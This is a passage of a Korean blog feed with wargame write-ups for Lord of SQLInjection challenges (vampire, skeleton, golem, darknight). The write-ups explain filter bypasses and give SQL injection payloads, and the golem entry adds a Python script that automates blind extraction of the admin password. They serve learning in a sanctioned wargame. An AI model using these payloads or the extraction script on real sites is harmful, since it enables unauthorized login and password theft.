<p>마지막 줄 조건문을 보면 <code>id</code>가 admin 이어야 한다는 조건이 있습니다.</p>
<p><code>&#39;</code>문자와 <code>admin</code> 문자열 필터링을 우회하여 <code>id</code>파라미터를 admin으로 만들어주면 됩니다.</p>
<br>

<br>

<hr>
<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/troll/solve_1.png">

<br>

<p>소문자 <code>admin</code>만 필터링하고 있기 때문에 간단하게 대문자로 우회를 해주었습니다.</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [9번_vampire] Write UP</title>
    <url>/2021/10/03/2021-10-03-Lord_of_SQLInjection_9_vampire/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>9번 문제인 vampire을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/vampire/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$_GET</span>[id] = strtolower(<span class="variable">$_GET</span>[id]);</span><br><span class="line">  <span class="variable">$_GET</span>[id] = str_replace(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[id]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_vampire where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;vampire&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[id] = strtolower(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="variable">$_GET</span>[id] = str_replace(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[id]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_vampire where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;vampire&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-3-줄-해석"><a href="#1-줄-3-줄-해석" class="headerlink" title="1 줄 ~ 3 줄 해석"></a>1 줄 ~ 3 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[id] = strtolower(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="variable">$_GET</span>[id] = str_replace(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[id]); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p>특수문자 <code>&#39;</code>를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<p><code>strtolower</code>함수는 대문자를 소문자로 바꾸어 주는 함수입니다.</p>
<p><code>str_replace</code> 함수는 치환 함수입니다.</p>
<blockquote>
<p>첫 번째 인자 : 찾을 문자</p>
<p>두 번째 인자 : 변경하려는 문자</p>
<p>세 번째 인자 : replace 대상 문자열 (변수)</p>
</blockquote>
<br>

<br>

<h2 id="4-줄-6-줄-해석"><a href="#4-줄-6-줄-해석" class="headerlink" title="4 줄 ~ 6 줄 해석"></a>4 줄 ~ 6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_vampire where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;vampire&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>마지막 줄 조건문을 보면 <code>id</code>가 admin 이어야 한다는 조건이 있습니다.</p>
<p><code>strtolower</code>함수와 <code>str_replace</code>함수를 우회하여 <code>id</code> 파라미터를 admin으로 만들어주면 됩니다.</p>
<br>

<br>

<hr>
<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/vampire/solve_1.png">

<br>

<p><code>str_replace</code>함수가 <code>admin</code> 을 찾아 공백으로 치환해주기 때문에 ad<del>admin</del>min 이렇게 우회를 해주었습니다.</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [10번_skeleton] Write UP</title>
    <url>/2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>10번 문제인 skeleton을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/skeleton/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p>문자열 <code>prob</code>와 문자 <code>_</code> <code>.</code> <code>(</code> <code>)</code> 를 필터링 하고 있습니다.</p>
<br>

<br>

<h2 id="2-줄-3-줄-해석"><a href="#2-줄-3-줄-해석" class="headerlink" title="2 줄 ~ 3 줄 해석"></a>2 줄 ~ 3 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 <code>id</code>는 guest로 고정되어있고 <code>pw</code>파라미터 뒤에 <code>and 1=0</code>으로 거짓으로 만들어주고 있습니다.</p>
<p>마지막 줄 조건문을 보면 <code>id</code>가 admin 이어야 한다는 조건이 있습니다.</p>
<br>

<br>

<hr>
<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/skeleton/solve_1.png">

<br>

<p>쿼리문 맨 뒤 <code>and 1=0</code>를 무력화 시키기 위해 주석을 사용하였습니다.</p>
<blockquote>
<p>?pw=1&#x27; or id= &#x27;admin&#x27;#<del><span style="color:green">&#x27; and 1=0</span></del></p>
</blockquote>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [11번_golem] Write UP</title>
    <url>/2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>11번 문제인 golem를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/golem/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_golem where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>조건문</code>과 <code>query문</code>, <code>addslashes 함수</code>, <code>pw</code> 변수 값과 <code>GET으로 받아온 pw 파라미터 값</code>이 같아야 한다는 <code>조건문</code>이 있습니다.</p>
<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>, <code>or</code>, <code>and</code>, <code>substr</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> <code>=</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="4-줄-해석"><a href="#4-줄-해석" class="headerlink" title="4 줄 해석"></a>4 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="5-줄-7-줄-해석"><a href="#5-줄-7-줄-해석" class="headerlink" title="5 줄 ~ 7 줄 해석"></a>5 줄 ~ 7 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/golem/solve_1.png">

<br>

<p><code>pw</code> 파라미터를 참으로 만들어주니 Hello admin이 출력되었습니다.</p>
<p><code>=</code> 특수문자는 <code>like</code>로 우회가 가능합니다.</p>
<br>

<br>

<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
<br>

<p><code>?pw=1&#39; || id like &#39;admin&#39; %26%26 length(pw) like &#39;1</code><br>MySQL의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
<br>

<p><code>?pw=1&#39; || id like &#39;admin&#39; %26%26 substring(pw,1,1) like &#39;0</code><br>MySQL의 <code>substring</code> 함수를 사용하여 <code>substr</code>필터링을 우회 하고 <code>pw</code>를 하나 씩 추출하여 참인지 확인해야 합니다.</p>
<br>

<blockquote>
<p><code>substring(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
<p><code>str</code> : 원본 문자열</p>
<p><code>pos</code> : 시작 위치 값</p>
<p><code>len</code> : 가져올 길이 값</p>
</blockquote>
<br>

<p>예를 들어 <code>substring(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
<br>

<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 소요됩니다.</p>
<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1&#x27; || id like &#x27;admin&#x27; %26%26 &quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw) like &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;substring(pw,&#123;&#125;,1) like &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>



<p>url을 적어 줍니다. <code>?pw=1&#39; || id like &#39;admin&#39; %26%26 </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
<br>

<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
<br>

<p><code>substring</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
<p><code>i</code>는 <code>1 ~ length+1</code> 까지 돌아갑니다.</p>
<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
<br>

<img src="/images/Lord of SQLInjection/golem/solve_2.png">

<br>

<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/golem/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/golem/solve_4.png">

<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [12번_darknight] Write UP</title>
    <url>/2021/10/23/2021-10-23-Lord_of_SQLInjection_12_darknight/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>12번 문제인 darknight를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/darknight/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkknight where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;darkknight&quot;</span>); </span><br><span class="line">  highlight_file(<span 